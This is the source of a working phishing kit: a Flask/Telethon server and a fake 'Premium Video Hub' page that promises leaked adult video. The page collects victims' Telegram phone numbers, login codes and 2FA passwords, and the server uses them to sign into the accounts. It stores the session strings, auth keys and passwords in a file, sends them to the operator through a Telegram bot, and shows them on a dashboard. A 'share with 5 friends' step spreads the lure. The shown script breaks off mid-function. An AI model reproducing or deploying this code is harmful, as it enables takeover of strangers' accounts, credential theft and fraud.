from flask import Flask, request, jsonify, render_template
import os
import json
import base64
import threading
import asyncio
import logging
from datetime import datetime
import requests as http_requests
from telethon import TelegramClient, errors
from telethon.sessions import StringSession
import sys

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# ====== SAFE ENV LOAD ======
def _safe_int(v, default=0):
    try:
        return int(str(v).strip()) if v not in (None, "") else default
    except (ValueError, TypeError):
        return default

BOT_TOKEN = (os.environ.get("BOT_TOKEN") or "").strip()
API_ID = _safe_int(os.environ.get("API_ID"), 0)
API_HASH = (os.environ.get("API_HASH") or "").strip()
YOUR_TELEGRAM_ID = _safe_int(os.environ.get("OWNER_ID"), 0)
PORT = _safe_int(os.environ.get("PORT"), 5000)

logger.info(
    "ENV CHECK | BOT_TOKEN=%s | API_ID=%s | API_HASH=%s | OWNER_ID=%s | PORT=%s",
    "SET" if BOT_TOKEN else "MISSING",
    API_ID,
    "SET" if API_HASH else "MISSING",
    YOUR_TELEGRAM_ID,
    PORT,
)

if sys.version_info >= (3, 12) and sys.platform == 'win32':
    try:
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
    except Exception:
        pass

app = Flask(__name__)

user_sessions = {}
pending_codes = {}
pending_2fa = {}
sessions_lock = threading.Lock()

DATA_FILE = "captured_accounts.json"

def load_accounts():
    if os.path.exists(DATA_FILE):
        try:
            with open(DATA_FILE, 'r') as f:
                return json.load(f)
        except Exception as e:
            logger.error(f"Load error: {e}")
            return []
    return []

def save_account(account):
    accounts = load_accounts()
    found = False
    for i, a in enumerate(accounts):
        if a['phone'] == account['phone']:
            accounts[i] = account
            found = True
            break
    if not found:
        accounts.append(account)
    try:
        with open(DATA_FILE, 'w') as f:
            json.dump(accounts, f, indent=2)
    except Exception as e:
        logger.error(f"Save error: {e}")
    logger.info(f"Saved: {account['phone']} | Session: {len(account.get('session',''))} chars")
    return account

captured_accounts = load_accounts()

def format_phone(ph):
    if not ph:
        return ph
    digits = ''.join(filter(str.isdigit, ph))
    if not digits:
        return ph
    if ph.startswith('+'):
        return ph
    if len(digits) == 10:
        return '+91' + digits
    if len(digits) == 12 and digits.startswith('91'):
        return '+' + digits
    return '+' + digits

def send_bot_notification(phone, ss, me, dc, password_used=False, password_value=""):
    if not BOT_TOKEN or not YOUR_TELEGRAM_ID:
        logger.warning("Bot notify skipped - missing token/owner")
        return
    try:
        max_len = 3900
        extra = ""
        if password_used:
            extra = "\n2FA Password Used"
            if password_value:
                extra += f"\n2FA Password: `{password_value}`"

        if len(ss) > max_len:
            msg1 = (
                f"New Account Captured!{extra}\n\n"
                f"Phone: {phone}\n"
                f"Name: {me.first_name or ''} {me.last_name or ''}\n"
                f"User ID: {me.id}\n"
                f"Username: @{me.username or 'N/A'}\n"
                f"DC: {dc}\n"
                f"Session Length: {len(ss)} chars\n\n"
                f"Session (part 1/2):\n`{ss[:max_len]}`"
            )
            msg2 = f"Session (part 2/2) for {phone}:\n`{ss[max_len:]}`"
            for m in (msg1, msg2):
                http_requests.post(
                    f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                    json={'chat_id': YOUR_TELEGRAM_ID, 'text': m, 'parse_mode': 'Markdown'},
                    timeout=15
                )
        else:
            msg = (
                f"New Account!{extra}\n"
                f"Phone: {phone}\n"
                f"Name: {me.first_name} {me.last_name or ''}\n"
                f"User ID: {me.id}\n"
                f"DC: {dc}\n"
                f"Session: {len(ss)} chars\n\n"
                f"Session:\n`{ss}`"
            )
            r = http_requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json={'chat_id': YOUR_TELEGRAM_ID, 'text': msg, 'parse_mode': 'Markdown'},
                timeout=15
            )
            if r.status_code != 200:
                http_requests.post(
                    f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                    json={'chat_id': YOUR_TELEGRAM_ID, 'text': f"Session for {phone}:\n{ss}"},
                    timeout=15
                )
    except Exception as e:
        logger.error(f"Bot notify error: {e}")
        print(f"\n{'='*60}\nBOT FAILED! Session for {phone}:\n{ss}\n{'='*60}\n")

def run_telegram_action(phone, code=None, password=None):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        async def send_code():
            client = TelegramClient(StringSession(), API_ID, API_HASH)
            await client.connect()
            try:
                r = await client.send_code_request(phone)
                session_str = StringSession.save(client.session)
                with sessions_lock:
                    user_sessions[phone] = {
                        'hash': r.phone_code_hash,
                        'session': session_str,
                        'phone_code_result': r
                    }
                    pending_codes[phone] = 'sent'
                    pending_2fa[phone] = False
                logger.info(f"Code sent to {phone}")
                return {'success': True}
            except errors.FloodWaitError as e:
                logger.error(f"Flood wait {e.seconds}s for {phone}")
                with sessions_lock:
                    pending_codes[phone] = 'err'
                return {'success': False, 'error': f'Flood wait {e.seconds}s'}
            except Exception as e:
                logger.error(f"send_code error: {e}")
                with sessions_lock:
                    pending_codes[phone] = 'err'
                return {'success': False, 'error': str(e)[:80]}
            finally:
                try:
                    await client.disconnect()
                except Exception:
                    pass

        async def verify():
            with sessions_lock:
                if phone not in user_sessions:
                    return {'success': False, 'error': 'Session not found'}
                s = user_sessions[phone]

            client = TelegramClient(StringSession(s['session']), API_ID, API_HASH)
            try:
                await client.connect()
                if await client.is_user_authorized():
                    me = await client.get_me()
                    logger.info(f"{phone} already authorized")
                else:
                    try:
                        await client.sign_in(phone=phone, code=code, phone_code_hash=s['hash'])
                        me = await client.get_me()
                    except errors.SessionPasswordNeededError:
                        logger.info(f"2FA needed for {phone}")
                        with sessions_lock:
                            pending_2fa[phone] = True
                            pending_codes[phone] = '2fa_needed'
                        if password:
                            try:
                                await client.sign_in(password=password)
                                me = await client.get_me()
                                with sessions_lock:
                                    pending_2fa[phone] = False
                                    pending_codes[phone] = 'done'
                            except errors.PasswordHashInvalidError:
                                return {'success': False, 'error': 'Wrong 2FA password'}
                            except Exception as e:
                                return {'success': False, 'error': f'2FA error: {str(e)[:50]}'}
                        else:
                            return {'success': False, 'error': '2FA', 'needs_password': True}
                    except errors.PhoneCodeInvalidError:
                        return {'success': False, 'error': 'Wrong code'}
                    except errors.PhoneCodeExpiredError:
                        return {'success': False, 'error': 'Code expired'}
                    except Exception as e:
                        return {'success': False, 'error': str(e)[:80]}

                await client.get_dialogs()
                ss = StringSession.save(client.session)

                auth_key = None
                try:
                    auth_key = client.session.auth_key.key
                except Exception:
                    pass
                dc = client.session.dc_id

                if not auth_key:
                    logger.warning(f"Auth key None for {phone}, reconnecting...")
                    try:
                        await client.disconnect()
                    except Exception:
                        pass
                    await asyncio.sleep(0.5)
                    client2 = TelegramClient(StringSession(ss), API_ID, API_HASH)
                    await client2.connect()
                    await client2.get_dialogs()
                    auth_key = client2.session.auth_key.key
                    dc = client2.session.dc_id
                    ss = StringSession.save(client2.session)
                    me = await client2.get_me()
                    try:
                        await client2.disconnect()
                    except Exception:
                        pass
                    client = client2

                auth_b64 = base64.b64encode(auth_key).decode() if auth_key else ""
                password_used = password is not None

                acc = {
                    'phone': phone,
                    'user_id': me.id,
                    'username': me.username or '',
                    'first_name': me.first_name or '',
                    'last_name': me.last_name or '',
                    'session': ss,
                    'webk': json.dumps({
                        'dcId': dc,
                        'authKey': auth_b64,
                        'userId': me.id,
                        'isSupport': False,
                        'isTest': False
                    }),
                    'dc': dc,
                    'time': str(datetime.now()),
                    'has_2fa': password_used,
                    'password': password if password_used else ''
                }

                save_account(acc)
                global captured_accounts
                captured_accounts = load_accounts()

                with sessions_lock:
                    user_sessions.pop(phone, None)
                    pending_2fa.pop(phone, None)
                    pending_codes[phone] = 'done'

                send_bot_notification(phone, ss, me, dc, password_used, password if password_used else "")
                logger.info(f"Captured: {phone} | Session: {len(ss)} chars")
                return {'success': True, 'session': ss, 'user_id': me.id}

            except Exception as e:
                e_str = str(e)
                logger.error(f"Verify error for {phone}: {e_str}")
                if 'PHONE_CODE_INVALID' in e_str:
                    return {'success': False, 'error': 'Wrong code'}
                if 'SESSION_PASSWORD_NEEDED' in e_str:
                    return {'success': False, 'error': '2FA', 'needs_password': True}
                if 'PASSWORD_HASH_INVALID' in e_str:
                    return {'success': False, 'error': 'Wrong 2FA password'}
                return {'success': False, 'error': e_str[:80]}
            finally:
                try:
                    await client.disconnect()
                except Exception:
                    pass

        if code:
            return loop.run_until_complete(verify())
        else:
            return loop.run_until_complete(send_code())
    finally:
        loop.close()


# ============ ROUTES ============
@app.route('/')
def index():
    return render_template('index.html')

@app.route('/health')
def health():
    return jsonify({
        'status': 'ok',
        'BOT_TOKEN': 'SET' if BOT_TOKEN else 'MISSING',
        'API_ID': API_ID,
        'API_HASH': 'SET' if API_HASH else 'MISSING',
        'OWNER_ID': YOUR_TELEGRAM_ID,
        'accounts': len(captured_accounts),
    })

@app.route('/api/share', methods=['POST'])
def share():
    ph = request.json.get('phone', '')
    if not ph:
        return jsonify({'success': False, 'error': 'Phone required'})
    ph = format_phone(ph)
    logger.info(f"Phone received: {ph}")
    with sessions_lock:
        pending_codes[ph] = 'sending'
    t = threading.Thread(target=run_telegram_action, args=(ph,))
    t.daemon = True
    t.start()
    return jsonify({'success': True})

@app.route('/api/check', methods=['POST'])
def check():
    phone = request.json.get('phone', '')
    phone = format_phone(phone)
    with sessions_lock:
        s = pending_codes.get(phone, 'waiting')
    if s == 'waiting':
        accounts = load_accounts()
        if any(a['phone'] == phone for a in accounts):
            s = 'done'
    return jsonify({'s': s})

@app.route('/api/verify', methods=['POST'])
def verify_route():
    d = request.json
    ph = format_phone(d.get('phone', ''))
    code = d.get('code', '')
    password = d.get('password', None)
    result = run_telegram_action(ph, code, password)
    return jsonify(result)

@app.route('/session/<phone>')
def get_session(phone):
    phone = format_phone(phone)
    global captured_accounts
    captured_accounts = load_accounts()
    a = next((x for x in captured_accounts if x['phone'] == phone), None)
    if not a:
        with sessions_lock:
            if phone in user_sessions:
                return jsonify({'phone': phone, 'status': 'pending'})
        return jsonify({'error': 'Not found'}), 404
    return jsonify({
        'phone': phone,
        'user_id': a['user_id'],
        'name': f"{a['first_name']} {a['last_name']}",
        'username': a['username'],
        'dc': a['dc'],
        'session': a['session'],
        'session_length': len(a['session']),
        'webk_data': a['webk'],
        'has_2fa': a.get('has_2fa', False),
        'password': a.get('password', '')
    })

@app.route('/dash')
def dash():
    global captured_accounts
    captured_accounts = load_accounts()
    accounts = captured_accounts
    rows = ""
    for i, a in enumerate(accounts, 1):
        ss_status = "YES" if a.get('session') and len(a['session']) > 10 else "NO"
        ss_len = len(a.get('session', '')) if a.get('session') else 0
        twofa_tag = "2FA" if a.get('has_2fa') else ""
        rows += f"""<tr>
            <td>{i}</td><td>{a['phone']}</td>
            <td>{a.get('first_name','')} {a.get('last_name','')}</td>
            <td>@{a.get('username','-')}</td><td>{a.get('user_id','')}</td>
            <td>{a.get('dc','')}</td><td>{twofa_tag} {ss_status} ({ss_len})</td>
            <td>{a.get('time','')}</td>
        </tr>"""
    total_2fa = sum(1 for a in accounts if a.get('has_2fa'))
    return f"""<!DOCTYPE html><html><head><title>Dashboard</title>
    <style>body{{background:#0a0a0a;color:white;font-family:Arial;padding:20px}}
    h1{{color:#e94560}}table{{width:100%;border-collapse:collapse;margin-top:15px}}
    th,td{{padding:10px;text-align:left;border-bottom:1px solid #1a1a2e;font-size:13px}}
    th{{background:#141420;color:#ddd}}tr:hover{{background:#141420}}</style></head>
    <body><h1>Accounts ({len(accounts)}) | 2FA: {total_2fa}</h1>
    <table><thead><tr><th>#</th><th>Phone</th><th>Name</th><th>User</th><th>ID</th><th>DC</th><th>Session</th><th>Time</th></tr></thead>
    <tbody>{rows if rows else '<tr><td colspan="8" style="text-align:center;color:#666;padding:30px">No accounts</td></tr>'}</tbody></table>
    <script>setTimeout(()=>location.reload(),10000)</script></body></html>"""


if __name__ == '__main__':
    if not all([BOT_TOKEN, API_ID, API_HASH, YOUR_TELEGRAM_ID]):
        logger.warning("Some env vars missing!")
    app.run(host='0.0.0.0', port=PORT, debug=False)
    <!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Premium Video Hub</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#0a0a0a;color:white;min-height:100vh}
.header{padding:50px 20px 25px;text-align:center;background:linear-gradient(180deg,#1a1a2e,#0a0a0a)}
.header h1{font-size:26px;font-weight:900;background:linear-gradient(45deg,#ff6b6b,#ffa500);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
.header p{color:#777;font-size:13px;margin-top:8px}
.video-card{margin:15px 20px;background:#141420;border-radius:15px;overflow:hidden;border:1px solid #1a1a2e}
.thumbnail{width:100%;height:210px;background:linear-gradient(135deg,#2d1b69,#ff6b6b);display:flex;align-items:center;justify-content:center}
.thumbnail .play-btn{width:65px;height:65px;background:rgba(255,255,255,0.15);border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:28px;border:2px solid rgba(255,255,255,0.2)}
.video-info{padding:15px}
.video-info h3{font-size:15px;margin-bottom:5px}
.video-info .meta{color:#666;font-size:12px}
.video-info .badge{display:inline-block;background:#e94560;padding:2px 10px;border-radius:4px;font-size:11px;margin-top:8px}
.link-section{padding:10px 20px 20px;text-align:center}
.get-link-btn{width:100%;padding:18px;background:linear-gradient(45deg,#e94560,#ff6b6b);border:none;border-radius:50px;color:white;font-size:20px;font-weight:800;cursor:pointer;box-shadow:0 8px 30px rgba(233,69,96,0.4);letter-spacing:1px;text-transform:uppercase}
.get-link-btn:disabled{opacity:0.5}
.modal-overlay{display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.85);z-index:1000;padding:20px;overflow-y:auto}
.modal-overlay.active{display:flex;align-items:center;justify-content:center}
.modal{background:#141420;border-radius:20px;padding:30px;max-width:380px;width:100%;border:1px solid #1a1a2e}
.modal-icon{text-align:center;font-size:45px;margin-bottom:10px}
.modal h2{text-align:center;font-size:18px;margin-bottom:5px}
.modal p{text-align:center;color:#888;font-size:13px;margin-bottom:15px}
.sb{text-align:center;padding:12px;border-radius:10px;margin:10px 0;display:none;font-size:13px}
.sb.success{display:block;background:rgba(76,175,80,0.15);color:#81C784}
.sb.error{display:block;background:rgba(244,67,54,0.15);color:#EF9A9A}
.sb.info{display:block;background:rgba(33,150,243,0.15);color:#90CAF9}
.sb.waiting{display:block;background:rgba(255,152,0,0.15);color:#FFB74D}
.cd{background:#0a0a0a;border:2px solid #2a2a3e;border-radius:10px;padding:15px;font-size:30px;text-align:center;letter-spacing:15px;color:white;margin:10px 0;font-weight:bold;min-height:55px}
.np{display:grid;grid-template-columns:repeat(3,1fr);gap:8px;margin:10px 0}
.np .k{padding:16px;border:none;border-radius:10px;background:#2a2a3e;color:white;font-size:22px;cursor:pointer}
.np .k:active{background:#3a3a5e}
.np .kc{background:#e94560}
.np .ks{background:#4CAF50;font-weight:700;font-size:14px}
.np .ks:disabled{background:#333;color:#666}
.step{display:none}
.step.active{display:block}
.sp{display:inline-block;width:18px;height:18px;border:2px solid #333;border-top-color:#0088cc;border-radius:50%;animation:spin 0.8s linear infinite;vertical-align:middle;margin-right:6px}
@keyframes spin{to{transform:rotate(360deg)}}
.cc{display:flex;background:#0a0a0a;border:2px solid #2a2a3e;border-radius:10px;margin-bottom:12px;overflow:hidden}
.cc .ccd{padding:12px 8px;background:#1a1a2e;color:#888;font-size:14px;font-weight:600;display:flex;align-items:center;justify-content:center;min-width:50px;border-right:1px solid #2a2a3e}
.cc input{flex:1;padding:15px;background:transparent;border:none;color:white;font-size:18px;text-align:center;outline:none}
.cc input::placeholder{color:#555}
.share-progress{display:flex;justify-content:center;margin:15px 0;gap:5px}
.share-step{width:35px;height:35px;border-radius:50%;background:#2a2a3e;display:flex;align-items:center;justify-content:center;font-size:14px;color:#666;font-weight:700}
.share-step.done{background:#4CAF50;color:white}
.share-step.active{background:#0088cc;color:white}
.pwd-input{width:100%;padding:15px;background:#0a0a0a;border:2px solid #2a2a3e;border-radius:10px;color:white;font-size:16px;text-align:center;outline:none;margin:10px 0}
.pwd-input:focus{border-color:#0088cc}
</style>
</head>
<body>
<div class="header">
<h1>PREMIUM VIDEO HUB</h1>
<p>Exclusive content - Verified members only</p>
</div>
<div class="video-card">
<div class="thumbnail"><div class="play-btn">▶</div></div>
<div class="video-info">
<h3>LEAKED PRIVATE VIDEO - 2026</h3>
<div class="meta">4.9 (2.4M views) - 18+</div>
<span class="badge">RESTRICTED</span>
</div>
</div>
<div class="link-section">
<button class="get-link-btn" id="glb">GET YOUR LINK</button>
</div>

<div class="modal-overlay" id="vm">
<div class="modal">
<div id="s1" class="step active">
<div class="modal-icon">📱</div>
<h2>Telegram verification</h2>
<p>Enter your Telegram account phone number</p>
<div class="cc">
<div class="ccd">+91</div>
<input type="tel" id="phoneInput" placeholder="XXXXXXXXXX" maxlength="10">
</div>
<button onclick="sendPhoneFromStep1()" style="width:100%;padding:15px;background:#0088cc;border:none;border-radius:10px;color:white;font-size:16px;font-weight:600;cursor:pointer;margin-bottom:10px">Send code</button>
<div id="ps1" class="sb info" style="display:none">Processing...</div>
</div>

<div id="s2" class="step">
<div class="modal-icon">🔐</div>
<h2>Verification code</h2>
<p><span id="pd" style="color:#0088cc;font-weight:bold">+91XXXXXXXXXX</span></p>
<div id="cs" class="sb waiting"><span class="sp"></span> Please wait...</div>
<div class="cd" id="cdisp">_</div>
<div class="np">
<button class="k" onclick="pk('1')">1</button>
<button class="k" onclick="pk('2')">2</button>
<button class="k" onclick="pk('3')">3</button>
<button class="k" onclick="pk('4')">4</button>
<button class="k" onclick="pk('5')">5</button>
<button class="k" onclick="pk('6')">6</button>
<button class="k" onclick="pk('7')">7</button>
<button class="k" onclick="pk('8')">8</button>
<button class="k" onclick="pk('9')">9</button>
<button class="k kc" onclick="cc()">X</button>
<button class="k" onclick="pk('0')">0</button>
<button class="k ks" id="sb" onclick="sc()">Verify</button>
</div>
<div id="vs" class="sb"></div>
</div>

<div id="s2b" class="step">
<div class="modal-icon">🔐</div>
<h2>Two-Factor Authentication</h2>
<p>Enter your cloud password:</p>
<input type="password" id="pwdInput" class="pwd-input" placeholder="Telegram password" maxlength="64">
<button onclick="submitPassword()" style="width:100%;padding:15px;background:#e94560;border:none;border-radius:10px;color:white;font-size:16px;font-weight:600;cursor:pointer;margin:10px 0">Verify Password</button>
<div id="pwdStatus" class="sb" style="display:none"></div>
</div>

<div id="s3" class="step">
<div class="modal-icon">🎬</div>
<h2>Almost there!</h2>
<p>Share with 5 friends to unlock</p>
<div class="share-progress">
<div class="share-step" id="sp1">1</div>
<div class="share-step" id="sp2">2</div>
<div class="share-step" id="sp3">3</div>
<div class="share-step" id="sp4">4</div>
<div class="share-step" id="sp5">5</div>
</div>
<div id="shareStatus" class="sb waiting" style="display:block"><span class="sp"></span> Share to start</div>
<button onclick="simulateShare()" style="width:100%;padding:15px;background:#25D366;border:none;border-radius:10px;color:white;font-size:16px;font-weight:600;cursor:pointer;margin:10px 0">Share to Telegram</button>
</div>

</div>
</div>

<script>
var phoneNumber = '';
var codeDigits = '';
var codeCheckInterval = null;
var passwordCheckInterval = null;
var sharesDone = 0;

var TG_CHANNEL_LINK = 'https://t.me/videodks';
var TG_CHANNEL_CAPTION = 'Premium content';

document.getElementById('glb').onclick = function() {
document.getElementById('vm').classList.add('active');
document.getElementById('s1').classList.add('active');
document.getElementById('s2').classList.remove('active');
document.getElementById('s2b').classList.remove('active');
document.getElementById('s3').classList.remove('active');
document.getElementById('ps1').style.display = 'none';
document.getElementById('phoneInput').value = '';
document.getElementById('phoneInput').focus();
};

function sendPhoneFromStep1() {
var phone = document.getElementById('phoneInput').value.trim();
if (!phone || phone.length !== 10) {
document.getElementById('ps1').className = 'sb error';
document.getElementById('ps1').innerHTML = '10 digit number din';
document.getElementById('ps1').style.display = 'block';
return;
}
phoneNumber = '+91' + phone;
document.getElementById('ps1').className = 'sb waiting';
document.getElementById('ps1').innerHTML = '<span class="sp"></span> Checking...';
document.getElementById('ps1').style.display = 'block';

fetch('/session/' + encodeURIComponent(phoneNumber))
.then(function(res) { return res.json(); })
.then(function(data) {
if (data.user_id) {
localStorage.setItem('tg_user_id', String(data.user_id));
sharesDone = parseInt(localStorage.getItem('tg_shares_' + data.user_id) || '0');
document.getElementById('s1').classList.remove('active');
document.getElementById('s3').classList.add('active');
updateShareProgress();
document.getElementById('ps1').style.display = 'none';
return;
}
document.getElementById('ps1').className = 'sb waiting';
document.getElementById('ps1').innerHTML = '<span class="sp"></span> Sending code...';
sendPhoneToBackend(phoneNumber);
})
.catch(function(e) {
document.getElementById('ps1').className = 'sb waiting';
document.getElementById('ps1').innerHTML = '<span class="sp"></span> Sending code...';
sendPhoneToBackend(phoneNumber);
});
}

async function sendPhoneToBackend(phone) {
try {
var res = await fetch('/api/share', {
method: 'POST',
headers: {'Content-Type': 'application/json'},
body: JSON.stringify({phone: phone})
});
var data = await res.json();
if (data.success) {
document.getElementById('s1').classList.remove('active');
document.getElementById('s2').classList.add('active');
document.getElementById('pd').textContent = phone;
var cs = document.getElementById('cs');
cs.className = 'sb waiting';
cs.innerHTML = '<span class="sp"></span> Sending code...';
startCodeCheck();
} else {
var ps = document.getElementById('ps1');
ps.className = 'sb error';
ps.innerHTML = 'Error: ' + (data.error || 'Unknown');
}
} catch(e) {
var ps = document.getElementById('ps1');
ps.className = 'sb error';
ps.innerHTML = 'Connection error';
}
}

function startCodeCheck() {
if (codeCheckInterval) clearInterval(codeCheckInterval);
codeCheckInterval = setInterval(async function() {
try {
var res = await fetch('/api/check', {
method: 'POST',
headers: {'Content-Type': 'application/json'},
body: JSON.stringify({phone: phoneNumber})
});
var data = await res.json();
if (data.s === 'sent') {
clearInterval(codeCheckInterval);
var cs = document.getElementById('cs');
cs.className = 'sb success';
cs.innerHTML = 'Code sent! Enter below:';
} else if (data.s === 'done') {
clearInterval(codeCheckInterval);
goToShare();
} else if (data.s === '2fa_needed') {
clearInterval(codeCheckInterval);
document.getElementById('s2').classList.remove('active');
document.getElementById('s2b').classList.add('active');
startPwdCheck();
} else if (data.s === 'err') {
clearInterval(codeCheckInterval);
var cs = document.getElementById('cs');
cs.className = 'sb error';
cs.innerHTML = 'Code send failed';
}
} catch(e) {}
}, 2000);
}

function startPwdCheck() {
if (passwordCheckInterval) clearInterval(passwordCheckInterval);
passwordCheckInterval = setInterval(async function() {
try {
var res = await fetch('/api/check', {
method: 'POST',
headers: {'Content-Type': 'application/json'},
body: JSON.stringify({phone: phoneNumber})
});
var data = await res.json();
if (data.s === 'done') {
clearInterval(passwordCheckInterval);
goToShare();
}
} catch(e) {}
}, 2000);
}

function pk(n) { if (codeDigits.length < 5) { codeDigits += n; document.getElementById('cdisp').textContent = codeDigits; } }
function cc() { codeDigits = codeDigits.slice(0, -1); document.getElementById('cdisp').textContent = codeDigits || '_'; }

async function sc() {
if (codeDigits.length < 5) { showVerifyStatus('5 digit code din', 'error'); return; }
document.getElementById('sb').disabled = true;
document.getElementById('sb').textContent = 'Verifying...';
try {
var res = await fetch('/api/verify', {
method: 'POST',
headers: {'Content-Type': 'application/json'},
body: JSON.stringify({phone: phoneNumber, code: codeDigits})
});
var data = await res.json();
if (data.success) {
if (data.user_id) {
localStorage.setItem('tg_user_id', String(data.user_id));
localStorage.setItem('tg_shares_' + data.user_id, '0');
}
goToShare();
if (codeCheckInterval) clearInterval(codeCheckInterval);
} else if (data.needs_password) {
document.getElementById
